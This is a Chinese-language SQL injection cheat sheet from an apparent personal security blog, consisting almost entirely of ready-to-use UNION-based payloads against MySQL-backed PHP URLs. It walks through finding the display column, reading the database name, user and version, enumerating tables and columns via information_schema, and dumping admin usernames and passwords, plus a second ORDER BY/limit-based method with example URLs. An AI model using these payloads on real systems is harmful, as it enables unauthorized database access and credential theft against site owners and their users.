---
layout: default
---
# ![](../img/hj.jpg)SQL Cheat-Sheet


## ![](../img/github7.png)SQL查询语句
```sql
SELECT username FROM users WHERE isadmin = 1 GROUP BY username ORDER BY username ASC
```
## ![](../img/github8.png)根据MySql日志监控里获取的sql语句判断可输出的只有一个字段，然后我们构造POC
```sql
id=-1 union select 222333#
```

## ![](../img/github9.png)构造获取数据库相关信息的POC
（只有-1或者and1=2这种假条件才会执行后面的union）
```sql
id=-1 union select concat(database(),0x5c,user(),0x5c,version())#
```
或者连带数据库名：

找到显示位后，先列出数据库名(用时只更换网址和显示位就行，hex不用换)：
```sql
http://www.test.cn/pro.php?id=-1 union select 1,
concat(0x757365723A,user(),0x5c,0x64617461626173653A,database(),0x5c,0x76657273696f6e3A,version())
3,4,5,
concat(0x616c6c207461626c65733A,GROUP_CONCAT(DISTINCT table_schema))
from information_schema.columns#
```
## ![](../img/github10.png)构造获取数据库sqlol中所有表信息的POC
```sql
id=-1 union select 1,2,3,GROUP_CONCAT(DISTINCT table_name),5,6 from information_schema.tables where table_schema=数据库名(不带括号)的hex值#
```
>小贱提示：如果是当前数据库，那就直接database()或hex(database())

## ![](../img/github11.png)构造获取admin表所有字段信息的POC
```sql
id=-1 union select 1,2,3,GROUP_CONCAT(DISTINCT column_name),5,6 from information_schema.columns where table_name=表名的hex值#
```

## ![](../img/github13.png)构造获取admin表账户密码的POC
```sql
id=-1 union select 1,2,3,GROUP_CONCAT(DISTINCT username,0x5f,password),5,6 from admin#
```
=====================方法2=====================
## 举例：www.test.com/pro.php?id=5
```
1、先order by 查看测试共有几个字段，order by 7正常，order by 8出错，union select 1,2,3,4,5,6,7,看显示哪个数，把那个数作为显示位置

2、爆表名格式：
union select 1,2,3,table_name,5,6,7 from (select * from information_schema.tables where table_schema=数据库名字的十六进制 order by table_schema limit 6,1)t limit 1--

这里数据库名字直接database()就行
如果是其他数据库名，则需要十六进制格式，且不用括号，直接数据库名
limit a,b是从第a个数据开始显示，b是显示个数，a从0开始计算

比如：
www.test.com/pro.php?id=5 and 1=2 union select 1,2,3,table_name,5,6,7 from (select * from information_schema.tables where table_schema=0x73716C6F6C order by table_schema limit 6,1)t limit 1--

3、爆字段名格式：
union select 1,2,3,column_name,5,6,7 from (select * from information_schema.columns where table_name=爆出来的表名的hex值 and table_schema=数据库名的hex值 order by 1 limit 0,1)t limit 1--

4、爆用户名密码:
www.test.com/pro.php?id=5 and 1=2 union select 1,2,3,concat(uid,0x5f,pwd),5,6,7 from admin
```


__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
